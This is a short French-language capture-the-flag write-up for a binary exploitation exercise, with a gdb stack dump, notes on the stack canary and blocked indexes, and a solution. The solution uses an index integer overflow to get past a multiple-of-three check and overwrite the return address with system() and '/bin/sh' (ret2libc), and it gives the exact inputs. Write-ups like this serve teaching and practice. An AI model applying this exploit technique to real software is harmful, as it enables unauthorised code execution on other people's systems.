## Notes

0x77777777 = 2004318071

(gdb) x/130wx $esp
0xffffd450:	0x08048d88	0xffffd608	0xf7fcfac0	0xf7fdc714
0xffffd460:	0x00000098	0xffffffff	0xffffd74c	0xffffd6d8
0xffffd470:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd480:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd490:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd4a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd4b0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd4c0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd4d0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd4e0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd4f0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd500:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd510:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd520:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd530:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd540:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd550:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd560:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd570:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd580:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd590:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd5a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd5b0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd5c0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd5d0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd5e0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd5f0:	0x00000000	0x00000000	0x77777777	0x77777777
0xffffd600:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd610:	0x00000000	0x00000000	0x00000000	0x30f52500
0xffffd620:	0xf7feb620	0x00000000	0x08048a09	0xf7fceff4
0xffffd630:	0x00000000	0x00000000	0x00000000	0xf7e45513
0xffffd640:	0x00000001	0xffffd6d4	0xffffd6dc	0xf7fd3000

ne peut pas écrire à 100 (esp+0x1b4 = 0xffffd604) parce que c'est la où
la valeur de retour de store_number est écrite
ne peut pas écrire de 101 (esp+0x1b8 = 0xffffd608) à 105 parce que
ces 4 dwords sont remis à zero juste apres
on dirait que 106 (esp+0x1cc = 0xffffd61c) est le canary

on peut pas overwrite ret parce que 114 est un multiple de 3

0xffffffff = 4294967295 (unsigned dword)

## Explication

Le programme nous laisse écrire en mémoire mais c'est mal protégé: il nous
empêche d'écrire à des indexs multiples de 3. Pas de chance, l'adresse de ret
est à un multiple de 3.

## Solution

en fait la multiplication par 4 (qui calcule l'adresse où enregistrer le nombre)
va bitshift de 2 l'index vers la gauche.
Donc tu peux mettre un grand nombre et les deux derniers bits de ton index vont
être tej et tu peux revenir à ton index de 114 x 4 comme ça.

Donc pour écrire à l'index 114, tu prends 114 et tu passe son dernier bit à 1:
114 + 2^31 = 2147483762

adresse de system: 0xf7e6aed0 = 4159090384
adresse de "/bin/sh": 0xf7f897ec = 4160264172

Donc un petit `store > 4159090384 > 2147483762`
Puis un petit `store > 4160264172 > 116`
Avec enfin un `quit`
Et c'est gagné
